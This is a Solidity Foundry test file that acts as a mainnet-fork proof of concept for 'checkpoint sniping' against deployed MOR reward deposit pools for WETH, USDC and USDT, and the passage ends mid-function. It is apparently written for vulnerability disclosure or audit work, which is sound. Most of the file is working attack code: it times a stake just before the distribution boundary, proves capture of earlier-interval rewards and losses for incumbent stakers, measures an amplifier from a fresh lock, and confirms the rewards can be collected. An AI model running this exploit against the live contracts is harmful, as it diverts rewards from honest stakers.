     1|// SPDX-License-Identifier: MIT
     2|pragma solidity ^0.8.24;
     3|
     4|import {Test, console2} from "forge-std/Test.sol";
     5|
     6|interface IERC20Checkpoint {
     7|    function approve(address spender, uint256 amount) external returns (bool);
     8|    function balanceOf(address account) external view returns (uint256);
     9|}
    10|
    11|interface IDepositPoolCheckpoint {
    12|    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    13|    function withdraw(uint256 rewardPoolIndex_, uint256 amount_) external;
    14|    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    15|    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    16|    function distributor() external view returns (address);
    17|    function rewardPoolsData(uint256)
    18|        external
    19|        view
    20|        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    21|    function rewardPoolsProtocolDetails(uint256)
    22|        external
    23|        view
    24|        returns (
    25|            uint128 withdrawLockPeriodAfterStake,
    26|            uint128 claimLockPeriodAfterStake,
    27|            uint128 claimLockPeriodAfterClaim,
    28|            uint256 minimalStake,
    29|            uint256 distributedRewards
    30|        );
    31|    function usersData(address user_, uint256 poolId_)
    32|        external
    33|        view
    34|        returns (
    35|            uint128 lastStake,
    36|            uint256 deposited,
    37|            uint256 rate,
    38|            uint256 pendingRewards,
    39|            uint128 claimLockStart,
    40|            uint128 claimLockEnd,
    41|            uint256 virtualDeposited,
    42|            uint128 lastClaim,
    43|            address referrer
    44|        );
    45|}
    46|
    47|interface IRewardPoolCheckpoint {
    48|    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_) external view returns (uint256);
    49|}
    50|
    51|interface IDistributorCheckpoint {
    52|    function distributeRewards(uint256 rewardPoolIndex_) external;
    53|    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_) external view returns (uint256);
    54|    function rewardPool() external view returns (address);
    55|    function rewardPoolLastCalculatedTimestamp(uint256 rewardPoolIndex_) external view returns (uint128);
    56|    function minRewardsDistributePeriod() external view returns (uint256);
    57|    function chainLinkDataConsumer() external view returns (address);
    58|    function depositPoolAddresses(uint256 rewardPoolIndex_, uint256 index_) external view returns (address);
    59|    function depositPools(uint256 rewardPoolIndex_, address depositPoolAddress_)
    60|        external
    61|        view
    62|        returns (
    63|            address token,
    64|            string memory chainLinkPath,
    65|            uint256 tokenPrice,
    66|            uint256 deposited,
    67|            uint256 lastUnderlyingBalance,
    68|            uint8 strategy,
    69|            address aToken,
    70|            bool isExist
    71|        );
    72|}
    73|
    74|/// @notice Pinned-mainnet-fork differential PoC for historical reward checkpoint sniping.
    75|/// A stake shortly before lastCalculated + minPeriod is admitted before the prior interval is
    76|/// checkpointed. The first eligible checkpoint then allocates the prior interval with the
    77|/// attacker's new weight.
    78|contract CheckpointSnipingPoC is Test {
    79|    uint256 constant FORK_BLOCK = 25_869_553; // timestamp exactly deployed lastCalculated
    80|    uint256 constant POOL_ID = 0;
    81|    uint256 constant AMOUNT = 1_000 ether;
    82|    uint256 constant LIVE_AMOUNT = 100 ether;
    83|    uint256 constant USDC_ATTACK_AMOUNT = 1_000_000e6;
    84|    uint256 constant USDT_ATTACK_AMOUNT = 1_000e6;
    85|    uint256 constant NEXT_BLOCK_SECONDS = 12;
    86|    uint256 constant RATE_PRECISION = 1e25;
    87|
    88|    IDepositPoolCheckpoint constant WETH_POOL =
    89|        IDepositPoolCheckpoint(0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384);
    90|    IERC20Checkpoint constant WETH = IERC20Checkpoint(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    91|    IDepositPoolCheckpoint constant USDC_POOL =
    92|        IDepositPoolCheckpoint(0x6cCE082851Add4c535352f596662521B4De4750E);
    93|    IERC20Checkpoint constant USDC = IERC20Checkpoint(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    94|    IDepositPoolCheckpoint constant USDT_POOL =
    95|        IDepositPoolCheckpoint(0x3B51989212BEdaB926794D6bf8e9E991218cf116);
    96|    IERC20Checkpoint constant USDT = IERC20Checkpoint(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    97|
    98|    address honest = makeAddr("checkpoint-honest");
    99|    address attacker = makeAddr("checkpoint-attacker");
   100|
   101|    struct BranchResult {
   102|        uint256 attackerReward;
   103|        uint256 honestReward;
   104|        uint256 wethPoolRewardDelta;
   105|        uint256 totalVirtualAtSettlement;
   106|    }
   107|
   108|    struct LiveBranchResult {
   109|        uint256 attackerReward;
   110|        uint256 incumbentReward;
   111|    }
   112|
   113|    function setUp() public {
   114|        vm.createSelectFork("eth", FORK_BLOCK);
   115|    }
   116|
   117|    function test_checkpointSniping() public {
   118|        IDistributorCheckpoint distributor = IDistributorCheckpoint(WETH_POOL.distributor());
   119|        uint128 lastCalculated = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
   120|        uint256 minPeriod = distributor.minRewardsDistributePeriod();
   121|
   122|        emit log_named_uint("fork timestamp", block.timestamp);
   123|        emit log_named_uint("lastCalculated", lastCalculated);
   124|        emit log_named_uint("min distribution period", minPeriod);
   125|        assertEq(block.timestamp, lastCalculated, "fork not pinned at interval start");
   126|        assertEq(minPeriod, 1 days, "deployed min period changed");
   127|
   128|        // Controlled victim: present for the full interval.
   129|        _stake(honest, AMOUNT);
   130|        assertEq(WETH_POOL.getLatestUserReward(POOL_ID, honest), 0, "unexpected initial reward");
   131|
   132|        uint256 branchSnapshot = vm.snapshotState();
   133|        uint256 boundary = uint256(lastCalculated) + minPeriod;
   134|
   135|        // Control: checkpoint old interval first, then let attacker join next block.
   136|        BranchResult memory control = _runControl(distributor, boundary);
   137|
   138|        // Attack: join one slot before checkpoint eligibility, then settle the old interval
   139|        // after attacker weight entered denominator.
   140|        require(vm.revertToState(branchSnapshot), "snapshot revert failed");
   141|        BranchResult memory attack = _runAttack(distributor, boundary);
   142|
   143|        uint256 attackerHistoricalGain = attack.attackerReward - control.attackerReward;
   144|        uint256 honestLoss = control.honestReward - attack.honestReward;
   145|        uint256 totalProtocolEmissionWhileAttackerStaked = IRewardPoolCheckpoint(distributor.rewardPool())
   146|            .getPeriodRewards(
   147|                POOL_ID,
   148|                uint128(boundary - NEXT_BLOCK_SECONDS),
   149|                uint128(boundary + NEXT_BLOCK_SECONDS)
   150|            );
   151|
   152|        emit log_named_decimal_uint("control attacker historical MOR", control.attackerReward, 18);
   153|        emit log_named_decimal_uint("attack attacker historical MOR", attack.attackerReward, 18);
   154|        emit log_named_decimal_uint("ATTACKER HISTORICAL GAIN MOR", attackerHistoricalGain, 18);
   155|        emit log_named_decimal_uint(
   156|            "max protocol emission while attacker staked",
   157|            totalProtocolEmissionWhileAttackerStaked,
   158|            18
   159|        );
   160|        emit log_named_decimal_uint("control honest MOR", control.honestReward, 18);
   161|        emit log_named_decimal_uint("attack honest MOR", attack.honestReward, 18);
   162|        emit log_named_decimal_uint("HONEST LOSS MOR", honestLoss, 18);
   163|        emit log_named_decimal_uint("control WETH-pool reward delta", control.wethPoolRewardDelta, 18);
   164|        emit log_named_decimal_uint("attack WETH-pool reward delta", attack.wethPoolRewardDelta, 18);
   165|        emit log_named_decimal_uint("control virtual weight at settlement", control.totalVirtualAtSettlement, 18);
   166|        emit log_named_decimal_uint("attack virtual weight at settlement", attack.totalVirtualAtSettlement, 18);
   167|
   168|        assertEq(control.attackerReward, 0, "control attacker received pre-stake reward");
   169|        assertGt(attack.attackerReward, 0, "attack captured no historical reward");
   170|        assertGt(
   171|            attack.attackerReward,
   172|            totalProtocolEmissionWhileAttackerStaked,
   173|            "attacker reward could be explained by post-stake emission"
   174|        );
   175|        assertGt(control.honestReward, attack.honestReward, "full-period staker suffered no loss");
   176|        assertGt(attackerHistoricalGain, honestLoss, "unexpected differential shape");
   177|        assertGt(attack.totalVirtualAtSettlement, control.totalVirtualAtSettlement, "attacker weight not admitted early");
   178|
   179|        // Collectability and capital-cost check. No long claim multiplier is used.
   180|        // Deployed WETH pool locks stake withdrawals/claims for seven days.
   181|        (uint128 withdrawLock, uint128 claimLockAfterStake,,, ) = WETH_POOL.rewardPoolsProtocolDetails(POOL_ID);
   182|        assertEq(withdrawLock, 7 days, "withdraw lock changed");
   183|        assertEq(claimLockAfterStake, 7 days, "claim lock changed");
   184|
   185|        vm.warp(boundary + withdrawLock + 1);
   186|        _refreshChainlinkTimestamps(distributor);
   187|        uint256 principalBefore = WETH.balanceOf(attacker);
   188|        vm.prank(attacker);
   189|        WETH_POOL.withdraw(POOL_ID, type(uint256).max);
   190|        uint256 principalReturned = WETH.balanceOf(attacker) - principalBefore;
   191|        emit log_named_decimal_uint("principal returned after 7d", principalReturned, 18);
   192|        assertGe(principalReturned, AMOUNT - 10, "principal not returned");
   193|
   194|        (,,, uint256 pendingBeforeClaim,,,,,) = WETH_POOL.usersData(attacker, POOL_ID);
   195|        assertGe(pendingBeforeClaim, attack.attackerReward, "historical reward not preserved");
   196|        vm.deal(attacker, 0.1 ether);
   197|        vm.prank(attacker);
   198|        WETH_POOL.claim{value: 0.05 ether}(POOL_ID, attacker);
   199|        (,,, uint256 pendingAfterClaim,,,,,) = WETH_POOL.usersData(attacker, POOL_ID);
   200|        assertEq(pendingAfterClaim, 0, "claim did not clear pending reward");
   201|        emit log("CLAIM SUCCEEDED: historical reward reached production mint-message path");
   202|    }
   203|
   204|    function test_poolMatrix() public {
   205|        IDistributorCheckpoint distributor = IDistributorCheckpoint(WETH_POOL.distributor());
   206|        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
   207|            distributor.minRewardsDistributePeriod();
   208|        address[5] memory pools = [
   209|            address(0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790),
   210|            address(0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384),
   211|            address(0xdE283F8309Fd1AA46c95d299f6B8310716277A42),
   212|            address(0x6cCE082851Add4c535352f596662521B4De4750E),
   213|            address(0x3B51989212BEdaB926794D6bf8e9E991218cf116)
   214|        ];
   215|        uint256[5] memory beforeRewards;
   216|        for (uint256 i; i < pools.length; i++) {
   217|            beforeRewards[i] = distributor.getDistributedRewards(POOL_ID, pools[i]);
   218|        }
   219|
   220|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   221|        _refreshChainlinkTimestamps(distributor);
   222|        distributor.distributeRewards(POOL_ID);
   223|
   224|        for (uint256 i; i < pools.length; i++) {
   225|            (,, uint256 virtualWeight) = IDepositPoolCheckpoint(pools[i]).rewardPoolsData(POOL_ID);
   226|            uint256 dailyReward = distributor.getDistributedRewards(POOL_ID, pools[i]) - beforeRewards[i];
   227|            emit log_named_address("pool", pools[i]);
   228|            emit log_named_decimal_uint("incumbent virtual weight raw token units", virtualWeight, 18);
   229|            emit log_named_decimal_uint("checkpoint MOR allocation", dailyReward, 18);
   230|        }
   231|    }
   232|
   233|    function test_liveStateImpact() public {
   234|        IDistributorCheckpoint distributor = IDistributorCheckpoint(WETH_POOL.distributor());
   235|        uint128 lastCalculated = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
   236|        uint256 boundary = uint256(lastCalculated) + distributor.minRewardsDistributePeriod();
   237|        (,, uint256 incumbentVirtualWeight) = WETH_POOL.rewardPoolsData(POOL_ID);
   238|        uint256 initialRate = _currentPoolRate(distributor);
   239|        uint256 stateSnapshot = vm.snapshotState();
   240|
   241|        LiveBranchResult memory control =
   242|            _runLiveControl(distributor, boundary, initialRate, incumbentVirtualWeight);
   243|
   244|        // Attack: same deployed state; attacker enters one slot before checkpoint eligibility.
   245|        require(vm.revertToState(stateSnapshot), "snapshot revert failed");
   246|        LiveBranchResult memory attack =
   247|            _runLiveAttack(distributor, boundary, initialRate, incumbentVirtualWeight);
   248|        uint256 incumbentLoss = control.incumbentReward - attack.incumbentReward;
   249|        uint256 totalEmissionWhileStaked = IRewardPoolCheckpoint(distributor.rewardPool()).getPeriodRewards(
   250|            POOL_ID,
   251|            uint128(boundary - NEXT_BLOCK_SECONDS),
   252|            uint128(boundary + NEXT_BLOCK_SECONDS)
   253|        );
   254|
   255|        emit log_named_decimal_uint("deployed incumbent virtual weight", incumbentVirtualWeight, 18);
   256|        emit log_named_decimal_uint("live attack capital WETH", LIVE_AMOUNT, 18);
   257|        emit log_named_decimal_uint("live control attacker MOR", control.attackerReward, 18);
   258|        emit log_named_decimal_uint("LIVE ATTACKER HISTORICAL GAIN MOR", attack.attackerReward, 18);
   259|        emit log_named_decimal_uint("live control incumbent MOR", control.incumbentReward, 18);
   260|        emit log_named_decimal_uint("live attack incumbent MOR", attack.incumbentReward, 18);
   261|        emit log_named_decimal_uint("LIVE INCUMBENT LOSS MOR", incumbentLoss, 18);
   262|        emit log_named_decimal_uint("max protocol emission while attacker staked", totalEmissionWhileStaked, 18);
   263|
   264|        assertEq(control.attackerReward, 0, "control attacker received historical reward");
   265|        assertGt(attack.attackerReward, totalEmissionWhileStaked, "historical capture not proven");
   266|        assertGt(control.incumbentReward, attack.incumbentReward, "deployed incumbents lost nothing");
   267|        assertGt(incumbentLoss, 0, "zero deployed-state impact");
   268|    }
   269|
   270|    function test_usdcLiveStateImpactAndCollectability() public {
   271|        IDistributorCheckpoint distributor = IDistributorCheckpoint(USDC_POOL.distributor());
   272|        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
   273|            distributor.minRewardsDistributePeriod();
   274|        (,, uint256 incumbentVirtualWeight) = USDC_POOL.rewardPoolsData(POOL_ID);
   275|        uint256 initialRate = _currentPoolRateFor(USDC_POOL, distributor);
   276|        uint256 stateSnapshot = vm.snapshotState();
   277|
   278|        LiveBranchResult memory control =
   279|            _runUSDCControl(distributor, boundary, initialRate, incumbentVirtualWeight);
   280|
   281|        require(vm.revertToState(stateSnapshot), "snapshot revert failed");
   282|        LiveBranchResult memory attack =
   283|            _runUSDCAttack(distributor, boundary, initialRate, incumbentVirtualWeight);
   284|        uint256 incumbentLoss = control.incumbentReward - attack.incumbentReward;
   285|        uint256 emissionWhileStaked = IRewardPoolCheckpoint(distributor.rewardPool()).getPeriodRewards(
   286|            POOL_ID,
   287|            uint128(boundary - NEXT_BLOCK_SECONDS),
   288|            uint128(boundary + NEXT_BLOCK_SECONDS)
   289|        );
   290|
   291|        emit log_named_decimal_uint("USDC incumbent virtual weight", incumbentVirtualWeight, 6);
   292|        emit log_named_decimal_uint("USDC attack capital", USDC_ATTACK_AMOUNT, 6);
   293|        emit log_named_decimal_uint("USDC control attacker MOR", control.attackerReward, 18);
   294|        emit log_named_decimal_uint("USDC ATTACKER HISTORICAL GAIN MOR", attack.attackerReward, 18);
   295|        emit log_named_decimal_uint("USDC control incumbent MOR", control.incumbentReward, 18);
   296|        emit log_named_decimal_uint("USDC attack incumbent MOR", attack.incumbentReward, 18);
   297|        emit log_named_decimal_uint("USDC INCUMBENT LOSS MOR", incumbentLoss, 18);
   298|        emit log_named_decimal_uint("max protocol emission while attacker staked", emissionWhileStaked, 18);
   299|
   300|        assertEq(control.attackerReward, 0, "control attacker received old reward");
   301|        assertGt(attack.attackerReward, emissionWhileStaked, "USDC historical capture not proven");
   302|        assertGt(control.incumbentReward, attack.incumbentReward, "USDC incumbents lost nothing");
   303|
   304|        _proveUSDCCollectability(distributor, boundary, attack.attackerReward, USDC_ATTACK_AMOUNT);
   305|    }
   306|
   307|    function test_usdcCapitalCurveAndExactBoundary() public {
   308|        uint256[3] memory amounts = [uint256(100_000e6), uint256(1_000_000e6), uint256(10_000_000e6)];
   309|
   310|        for (uint256 i; i < amounts.length; i++) {
   311|            vm.createSelectFork("eth", FORK_BLOCK);
   312|            IDistributorCheckpoint distributor = IDistributorCheckpoint(USDC_POOL.distributor());
   313|            uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
   314|                distributor.minRewardsDistributePeriod();
   315|            (,, uint256 incumbentVirtualWeight) = USDC_POOL.rewardPoolsData(POOL_ID);
   316|            uint256 initialRate = _currentPoolRateFor(USDC_POOL, distributor);
   317|            uint256 stateSnapshot = vm.snapshotState();
   318|
   319|            LiveBranchResult memory control =
   320|                _runUSDCControlAmount(distributor, boundary, initialRate, incumbentVirtualWeight, amounts[i]);
   321|
   322|            require(vm.revertToState(stateSnapshot), "curve snapshot revert failed");
   323|            LiveBranchResult memory attack = _runUSDCAttackAmount(
   324|                distributor,
   325|                boundary,
   326|                initialRate,
   327|                incumbentVirtualWeight,
   328|                amounts[i],
   329|                boundary
   330|            );
   331|
   332|            uint256 incumbentLoss = control.incumbentReward - attack.incumbentReward;
   333|            uint256 emissionWhileStaked = IRewardPoolCheckpoint(distributor.rewardPool()).getPeriodRewards(
   334|                POOL_ID,
   335|                uint128(boundary),
   336|                uint128(boundary + NEXT_BLOCK_SECONDS)
   337|            );
   338|
   339|            emit log_named_decimal_uint("curve USDC capital", amounts[i], 6);
   340|            emit log_named_decimal_uint("curve attacker historical MOR", attack.attackerReward, 18);
   341|            emit log_named_decimal_uint("curve incumbent loss MOR", incumbentLoss, 18);
   342|            emit log_named_decimal_uint("curve max emission while staked MOR", emissionWhileStaked, 18);
   343|
   344|            assertEq(control.attackerReward, 0, "curve control got historical reward");
   345|            assertGt(attack.attackerReward, emissionWhileStaked, "curve historical capture not proven");
   346|            assertGt(incumbentLoss, 0, "curve incumbent loss missing");
   347|
   348|            if (i == amounts.length - 1) {
   349|                _proveUSDCCollectability(distributor, boundary, attack.attackerReward, amounts[i]);
   350|            }
   351|        }
   352|    }
   353|
   354|    function test_usdcFreshLockAmplifierAndCollectability() public {
   355|        uint256 amount = 100_000e6;
   356|        IDistributorCheckpoint distributor = IDistributorCheckpoint(USDC_POOL.distributor());
   357|        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
   358|            distributor.minRewardsDistributePeriod();
   359|        uint256 stateSnapshot = vm.snapshotState();
   360|
   361|        LiveBranchResult memory baseline = _runUSDCAttackAmount(
   362|            distributor,
   363|            boundary,
   364|            _currentPoolRateFor(USDC_POOL, distributor),
   365|            _usdcIncumbentWeight(),
   366|            amount,
   367|            boundary
   368|        );
   369|
   370|        require(vm.revertToState(stateSnapshot), "fresh-lock snapshot revert failed");
   371|        uint128 claimLockEnd = uint128(boundary + 365 days);
   372|        vm.warp(boundary);
   373|        uint128 checkpointBefore = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
   374|        _stakeTokenWithOptions(attacker, USDC, USDC_POOL, amount, claimLockEnd, address(0));
   375|        assertEq(
   376|            distributor.rewardPoolLastCalculatedTimestamp(POOL_ID),
   377|            checkpointBefore,
   378|            "fresh-lock entry unexpectedly checkpointed"
   379|        );
   380|        (,,,,,, uint256 lockedVirtual,,) = USDC_POOL.usersData(attacker, POOL_ID);
   381|
   382|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   383|        _refreshChainlinkTimestamps(distributor);
   384|        distributor.distributeRewards(POOL_ID);
   385|        uint256 lockedReward = USDC_POOL.getLatestUserReward(POOL_ID, attacker);
   386|
   387|        emit log_named_decimal_uint("fresh-lock USDC principal", amount, 6);
   388|        emit log_named_decimal_uint("fresh-lock virtual weight", lockedVirtual, 6);
   389|        emit log_named_decimal_uint("fresh-lock effective multiplier", (lockedVirtual * 1e18) / amount, 18);
   390|        emit log_named_decimal_uint("baseline historical MOR", baseline.attackerReward, 18);
   391|        emit log_named_decimal_uint("fresh-lock historical MOR", lockedReward, 18);
   392|        emit log_named_decimal_uint("fresh-lock amplification MOR", lockedReward - baseline.attackerReward, 18);
   393|
   394|        assertGt(lockedVirtual, amount, "fresh lock produced no weight amplifier");
   395|        assertGt(lockedReward, baseline.attackerReward, "fresh lock did not amplify historical capture");
   396|
   397|        (uint128 withdrawLock,,,,) = USDC_POOL.rewardPoolsProtocolDetails(POOL_ID);
   398|        vm.warp(boundary + withdrawLock + 1);
   399|        _refreshChainlinkTimestamps(distributor);
   400|        uint256 principalBefore = USDC.balanceOf(attacker);
   401|        vm.prank(attacker);
   402|        USDC_POOL.withdraw(POOL_ID, type(uint256).max);
   403|        uint256 principalReturned = USDC.balanceOf(attacker) - principalBefore;
   404|        assertGe(principalReturned, amount - 10, "fresh-lock principal not returned after 7d");
   405|        (,,, uint256 pendingAfterWithdraw,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
   406|        assertGe(pendingAfterWithdraw, lockedReward, "fresh-lock reward not preserved after withdrawal");
   407|
   408|        vm.warp(uint256(claimLockEnd) + 1);
   409|        _refreshChainlinkTimestamps(distributor);
   410|        vm.deal(attacker, 0.1 ether);
   411|        vm.prank(attacker);
   412|        USDC_POOL.claim{value: 0.05 ether}(POOL_ID, attacker);
   413|        (,,, uint256 pendingAfterClaim,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
   414|        assertEq(pendingAfterClaim, 0, "fresh-lock reward not collectible after expiry");
   415|        emit log("FRESH-LOCK CLAIM SUCCEEDED: amplified historical reward reached mint-message path");
   416|    }
   417|
   418|    function _usdcIncumbentWeight() private view returns (uint256 weight) {
   419|        (,, weight) = USDC_POOL.rewardPoolsData(POOL_ID);
   420|    }
   421|
   422|    function test_usdtLowCapitalImpactAndCollectability() public {
   423|        IDistributorCheckpoint distributor = IDistributorCheckpoint(USDT_POOL.distributor());
   424|        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
   425|            distributor.minRewardsDistributePeriod();
   426|        (,, uint256 incumbentVirtualWeight) = USDT_POOL.rewardPoolsData(POOL_ID);
   427|        uint256 initialRate = _currentPoolRateFor(USDT_POOL, distributor);
   428|        uint256 stateSnapshot = vm.snapshotState();
   429|
   430|        LiveBranchResult memory control =
   431|            _runUSDTControl(distributor, boundary, initialRate, incumbentVirtualWeight);
   432|        require(vm.revertToState(stateSnapshot), "snapshot revert failed");
   433|        LiveBranchResult memory attack =
   434|            _runUSDTAttack(distributor, boundary, initialRate, incumbentVirtualWeight);
   435|
   436|        uint256 incumbentLoss = control.incumbentReward - attack.incumbentReward;
   437|        uint256 emissionWhileStaked = IRewardPoolCheckpoint(distributor.rewardPool()).getPeriodRewards(
   438|            POOL_ID,
   439|            uint128(boundary - NEXT_BLOCK_SECONDS),
   440|            uint128(boundary + NEXT_BLOCK_SECONDS)
   441|        );
   442|
   443|        emit log_named_decimal_uint("USDT incumbent virtual weight", incumbentVirtualWeight, 6);
   444|        emit log_named_decimal_uint("USDT attack capital", USDT_ATTACK_AMOUNT, 6);
   445|        emit log_named_decimal_uint("USDT control attacker MOR", control.attackerReward, 18);
   446|        emit log_named_decimal_uint("USDT ATTACKER HISTORICAL GAIN MOR", attack.attackerReward, 18);
   447|        emit log_named_decimal_uint("USDT control incumbent MOR", control.incumbentReward, 18);
   448|        emit log_named_decimal_uint("USDT attack incumbent MOR", attack.incumbentReward, 18);
   449|        emit log_named_decimal_uint("USDT INCUMBENT LOSS MOR", incumbentLoss, 18);
   450|        emit log_named_decimal_uint("max protocol emission while attacker staked", emissionWhileStaked, 18);
   451|
   452|        assertEq(control.attackerReward, 0, "USDT control attacker received old reward");
   453|        assertGt(attack.attackerReward, emissionWhileStaked, "USDT historical capture not proven");
   454|        assertGt(control.incumbentReward, attack.incumbentReward, "USDT incumbents lost nothing");
   455|
   456|        (uint128 withdrawLock, uint128 claimLockAfterStake,,, ) = USDT_POOL.rewardPoolsProtocolDetails(POOL_ID);
   457|        assertEq(withdrawLock, 7 days, "USDT withdraw lock changed");
   458|        assertEq(claimLockAfterStake, 7 days, "USDT claim lock changed");
   459|        vm.warp(boundary + withdrawLock + 1);
   460|        _refreshChainlinkTimestamps(distributor);
   461|
   462|        uint256 principalBefore = USDT.balanceOf(attacker);
   463|        vm.prank(attacker);
   464|        USDT_POOL.withdraw(POOL_ID, type(uint256).max);
   465|        uint256 principalReturned = USDT.balanceOf(attacker) - principalBefore;
   466|        emit log_named_decimal_uint("USDT principal returned after 7d", principalReturned, 6);
   467|        assertGe(principalReturned, USDT_ATTACK_AMOUNT - 10, "USDT principal not returned");
   468|
   469|        (,,, uint256 pendingBeforeClaim,,,,,) = USDT_POOL.usersData(attacker, POOL_ID);
   470|        assertGe(pendingBeforeClaim, attack.attackerReward, "USDT historical reward not preserved");
   471|        vm.deal(attacker, 0.1 ether);
   472|        vm.prank(attacker);
   473|        USDT_POOL.claim{value: 0.05 ether}(POOL_ID, attacker);
   474|        (,,, uint256 pendingAfterClaim,,,,,) = USDT_POOL.usersData(attacker, POOL_ID);
   475|        assertEq(pendingAfterClaim, 0, "USDT claim did not clear pending reward");
   476|        emit log("USDT CLAIM SUCCEEDED: historical reward reached production mint-message path");
   477|    }
   478|
   479|    function _runUSDTControl(
   480|        IDistributorCheckpoint distributor,
   481|        uint256 boundary,
   482|        uint256 initialRate,
   483|        uint256 incumbentVirtualWeight
   484|    ) private returns (LiveBranchResult memory result) {
   485|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   486|        _refreshChainlinkTimestamps(distributor);
   487|        distributor.distributeRewards(POOL_ID);
   488|        _stakeToken(attacker, USDT, USDT_POOL, USDT_ATTACK_AMOUNT);
   489|        uint256 rate = _currentPoolRateFor(USDT_POOL, distributor);
   490|        result.attackerReward = USDT_POOL.getLatestUserReward(POOL_ID, attacker);
   491|        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
   492|    }
   493|
   494|    function _runUSDTAttack(
   495|        IDistributorCheckpoint distributor,
   496|        uint256 boundary,
   497|        uint256 initialRate,
   498|        uint256 incumbentVirtualWeight
   499|    ) private returns (LiveBranchResult memory result) {
   500|        vm.warp(boundary - NEXT_BLOCK_SECONDS);
   501|        _stakeToken(attacker, USDT, USDT_POOL, USDT_ATTACK_AMOUNT);
   502|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   503|        _refreshChainlinkTimestamps(distributor);
   504|        distributor.distributeRewards(POOL_ID);
   505|        uint256 rate = _currentPoolRateFor(USDT_POOL, distributor);
   506|        result.attackerReward = USDT_POOL.getLatestUserReward(POOL_ID, attacker);
   507|        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
   508|    }
   509|
   510|    function _proveUSDCCollectability(
   511|        IDistributorCheckpoint distributor,
   512|        uint256 boundary,
   513|        uint256 attackReward,
   514|        uint256 principalAmount
   515|    ) private {
   516|        (uint128 withdrawLock, uint128 claimLockAfterStake,,, ) = USDC_POOL.rewardPoolsProtocolDetails(POOL_ID);
   517|        assertEq(withdrawLock, 7 days, "USDC withdraw lock changed");
   518|        assertEq(claimLockAfterStake, 7 days, "USDC claim lock changed");
   519|        vm.warp(boundary + withdrawLock + 1);
   520|        _refreshChainlinkTimestamps(distributor);
   521|
   522|        uint256 principalBefore = USDC.balanceOf(attacker);
   523|        vm.prank(attacker);
   524|        USDC_POOL.withdraw(POOL_ID, type(uint256).max);
   525|        uint256 principalReturned = USDC.balanceOf(attacker) - principalBefore;
   526|        emit log_named_decimal_uint("USDC principal returned after 7d", principalReturned, 6);
   527|        assertGe(principalReturned, principalAmount - 10, "USDC principal not returned");
   528|
   529|        (,,, uint256 pendingBeforeClaim,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
   530|        assertGe(pendingBeforeClaim, attackReward, "USDC historical reward not preserved");
   531|        vm.deal(attacker, 0.1 ether);
   532|        vm.prank(attacker);
   533|        USDC_POOL.claim{value: 0.05 ether}(POOL_ID, attacker);
   534|        (,,, uint256 pendingAfterClaim,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
   535|        assertEq(pendingAfterClaim, 0, "USDC claim did not clear pending reward");
   536|        emit log("USDC CLAIM SUCCEEDED: historical reward reached production mint-message path");
   537|    }
   538|
   539|    function _runUSDCControl(
   540|        IDistributorCheckpoint distributor,
   541|        uint256 boundary,
   542|        uint256 initialRate,
   543|        uint256 incumbentVirtualWeight
   544|    ) private returns (LiveBranchResult memory result) {
   545|        return _runUSDCControlAmount(
   546|            distributor,
   547|            boundary,
   548|            initialRate,
   549|            incumbentVirtualWeight,
   550|            USDC_ATTACK_AMOUNT
   551|        );
   552|    }
   553|
   554|    function _runUSDCControlAmount(
   555|        IDistributorCheckpoint distributor,
   556|        uint256 boundary,
   557|        uint256 initialRate,
   558|        uint256 incumbentVirtualWeight,
   559|        uint256 amount
   560|    ) private returns (LiveBranchResult memory result) {
   561|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   562|        _refreshChainlinkTimestamps(distributor);
   563|        distributor.distributeRewards(POOL_ID);
   564|        _stakeToken(attacker, USDC, USDC_POOL, amount);
   565|        uint256 rate = _currentPoolRateFor(USDC_POOL, distributor);
   566|        result.attackerReward = USDC_POOL.getLatestUserReward(POOL_ID, attacker);
   567|        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
   568|    }
   569|
   570|    function _runUSDCAttack(
   571|        IDistributorCheckpoint distributor,
   572|        uint256 boundary,
   573|        uint256 initialRate,
   574|        uint256 incumbentVirtualWeight
   575|    ) private returns (LiveBranchResult memory result) {
   576|        return _runUSDCAttackAmount(
   577|            distributor,
   578|            boundary,
   579|            initialRate,
   580|            incumbentVirtualWeight,
   581|            USDC_ATTACK_AMOUNT,
   582|            boundary - NEXT_BLOCK_SECONDS
   583|        );
   584|    }
   585|
   586|    function _runUSDCAttackAmount(
   587|        IDistributorCheckpoint distributor,
   588|        uint256 boundary,
   589|        uint256 initialRate,
   590|        uint256 incumbentVirtualWeight,
   591|        uint256 amount,
   592|        uint256 entryTimestamp
   593|    ) private returns (LiveBranchResult memory result) {
   594|        vm.warp(entryTimestamp);
   595|        uint128 checkpointBefore = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
